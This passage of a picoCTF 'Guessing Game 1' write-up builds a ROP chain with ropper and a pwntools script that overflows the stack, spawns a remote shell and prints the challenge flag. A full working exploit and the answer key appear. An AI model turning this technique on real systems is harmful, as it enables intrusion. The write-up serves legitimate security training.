[INFO] ROPchain Generator for syscall execve:
[INFO]
write command into data section
rax 0xb
rdi address to cmd
rsi address to null
rdx address to null
[INFO] Try to create chain which fills registers without delete content of previous filled registers
[*] Try permuation 1 / 24
[INFO]
[INFO] Look for syscall gadget
[INFO] syscall gadget found
[INFO] generating rop chain
#!/usr/bin/env python
# Generated by ropper ropchain generator #
from struct import pack
p = lambda x : pack('Q', x)
IMAGE_BASE_0 = 0x0000000000400000 # f01c7ecf217d3cebdf4f676920f17ebfcb33d5d14d78df8dfffed5c5290e6f62
rebase_0 = lambda x : p(x + IMAGE_BASE_0)
rop = ''
rop += rebase_0(0x000000000000dbeb) # 0x000000000040dbeb: pop r13; ret;
rop += '//bin/sh'
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
rop += rebase_0(0x00000000002ba0e0)
rop += rebase_0(0x00000000000695c9) # 0x00000000004695c9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000000dbeb) # 0x000000000040dbeb: pop r13; ret;
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
rop += rebase_0(0x00000000002ba0e8)
rop += rebase_0(0x00000000000695c9) # 0x00000000004695c9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
rop += rebase_0(0x00000000002ba0e0)
rop += rebase_0(0x0000000000010ca3) # 0x0000000000410ca3: pop rsi; ret;
rop += rebase_0(0x00000000002ba0e8)
rop += rebase_0(0x000000000004cc26) # 0x000000000044cc26: pop rdx; ret;
rop += rebase_0(0x00000000002ba0e8)
rop += rebase_0(0x00000000000163f4) # 0x00000000004163f4: pop rax; ret;
rop += p(0x000000000000003b)
rop += rebase_0(0x0000000000049e35) # 0x0000000000449e35: syscall; ret;
print rop
[INFO] rop chain generated!
(ropper) root@kali:/media/sf_CTFs/pico/Guessing_Game_1# deactivate
```
We can incorporate this ROP chain into the following `pwntools` script:
```python
# First, generate a template via:
# $ pwn template --host jupiter.challenges.picoctf.org --port 28951 ./vuln
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
from struct import pack
import c_rand
class GuessingGame1():
    def __init__(self, io):
        self.io = io
        self.rand = c_rand.rand_gen()
    def guess(self, guess_val):
        self.io.recvuntil("What number would you like to guess?\n")
        log.debug("Guessing: '{}'".format(guess_val))
        self.io.sendline(guess_val)
        line = self.io.recvline()
        if not "Congrats!" in line.decode("ascii"):
            raise RuntimeError("Incorrect guess: {}".format(guess_val))
    def enter_name(self, name):
        log.debug("Entering name: '{}'".format(name))
        self.io.sendline(name)
    def send_payload(self, payload):
        guess_val = str((next(self.rand) % 100) + 1)
        log.info("Guessing: '{}'".format(guess_val))
        self.guess(guess_val)
        log.info("Sending payload: \n{}".format(hexdump(payload)))
        self.enter_name(payload)
        self.io.recvline()
        self.io.recvline()
        self.io.recvline()
def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(150, n = exe.bytes)
    gg1 = GuessingGame1(proc)
    with context.local(log_level='ERROR'): 
        gg1.send_payload(payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {}".format(offset))
    return offset
def get_rop():
    p = lambda x : pack('Q', x)
    IMAGE_BASE_0 = 0x0000000000400000 # f01c7ecf217d3cebdf4f676920f17ebfcb33d5d14d78df8dfffed5c5290e6f62
    rebase_0 = lambda x : p(x + IMAGE_BASE_0)
    rop = b''
    rop += rebase_0(0x000000000000dbeb) # 0x000000000040dbeb: pop r13; ret;
    rop += b'//bin/sh'
    rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
    rop += rebase_0(0x00000000002ba0e0)
    rop += rebase_0(0x00000000000695c9) # 0x00000000004695c9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x000000000000dbeb) # 0x000000000040dbeb: pop r13; ret;
    rop += p(0x0000000000000000)
    rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
    rop += rebase_0(0x00000000002ba0e8)
    rop += rebase_0(0x00000000000695c9) # 0x00000000004695c9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
    rop += rebase_0(0x00000000002ba0e0)
    rop += rebase_0(0x0000000000010ca3) # 0x0000000000410ca3: pop rsi; ret;
    rop += rebase_0(0x00000000002ba0e8)
    rop += rebase_0(0x000000000004cc26) # 0x000000000044cc26: pop rdx; ret;
    rop += rebase_0(0x00000000002ba0e8)
    rop += rebase_0(0x00000000000163f4) # 0x00000000004163f4: pop rax; ret;
    rop += p(0x000000000000003b)
    rop += rebase_0(0x0000000000049e35) # 0x0000000000449e35: syscall; ret;
    return rop
io = start()
io.recvuntil("Welcome to my guessing game!")
overflow_offset = get_overflow_offset()
payload = fit({overflow_offset: get_rop()})
assert(len(payload) <= 360)
gg1 = GuessingGame1(io)
gg1.send_payload(payload)
io.interactive()
```
The script uses the `c_rand` module to get the `rand()` value and guess correctly the missing number, then uses the `cyclic` pattern to find the overflow offset in `get_overflow_offset`, and finally overwrites the stack at the overflow offset with the ROP chain generated by `ropper`.
Output:
```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_1# python3 exploit.py
[*] '/media/sf_CTFs/pico/Guessing_Game_1/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to jupiter.challenges.picoctf.org on port 28951: Done
[+] Starting local process '/media/sf_CTFs/pico/Guessing_Game_1/vuln': pid 15083
[*] Process '/media/sf_CTFs/pico/Guessing_Game_1/vuln' stopped with exit code -11 (SIGSEGV) (pid 15083)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/Guessing_Game_1/core.15083'
    Arch:      amd64-64-little
    RIP:       0x400c8b
    RSP:       0x7ffdcc0bc5a8
    Exe:       '/media/sf_CTFs/pico/Guessing_Game_1/vuln' (0x400000)
    Fault:     0x6161616161616170
[*] Overflow offset: 120
[*] Guessing: '84'
[*] Sending payload:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│
    00000050  75 61 61 61  76 61 61 61  77 61 61 61  78 61 61 61  │uaaa│vaaa│waaa│xaaa│
    00000060  79 61 61 61  7a 61 61 62  62 61 61 62  63 61 61 62  │yaaa│zaab│baab│caab│
    00000070  64 61 61 62  65 61 61 62  eb db 40 00  00 00 00 00  │daab│eaab│··@·│····│
    00000080  2f 2f 62 69  6e 2f 73 68  96 06 40 00  00 00 00 00  │//bi│n/sh│··@·│····│
    00000090  e0 a0 6b 00  00 00 00 00  c9 95 46 00  00 00 00 00  │··k·│····│··F·│····│
    000000a0  ef be ad de  ef be ad de  ef be ad de  ef be ad de  │····│····│····│····│
    *
    000000c0  eb db 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │··@·│····│····│····│
    000000d0  96 06 40 00  00 00 00 00  e8 a0 6b 00  00 00 00 00  │··@·│····│··k·│····│
    000000e0  c9 95 46 00  00 00 00 00  ef be ad de  ef be ad de  │··F·│····│····│····│
    000000f0  ef be ad de  ef be ad de  ef be ad de  ef be ad de  │····│····│····│····│
    00000100  ef be ad de  ef be ad de  96 06 40 00  00 00 00 00  │····│····│··@·│····│
    00000110  e0 a0 6b 00  00 00 00 00  a3 0c 41 00  00 00 00 00  │··k·│····│··A·│····│
    00000120  e8 a0 6b 00  00 00 00 00  26 cc 44 00  00 00 00 00  │··k·│····│&·D·│····│
    00000130  e8 a0 6b 00  00 00 00 00  f4 63 41 00  00 00 00 00  │··k·│····│·cA·│····│
    00000140  3b 00 00 00  00 00 00 00  35 9e 44 00  00 00 00 00  │;···│····│5·D·│····│
    00000150
[*] Switching to interactive mode
$ ls
flag.txt
vuln
vuln.c
xinet_startup.sh
$ cat flag.txt
picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b30e66e722f3f0d0}
$ exit
$
[*] Got EOF while reading in interactive
$
[*] Closed connection to jupiter.challenges.picoctf.org port 28951
[*] Got EOF while sending in interactive
```
The flag: `picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b30e66e722f3f0d0}`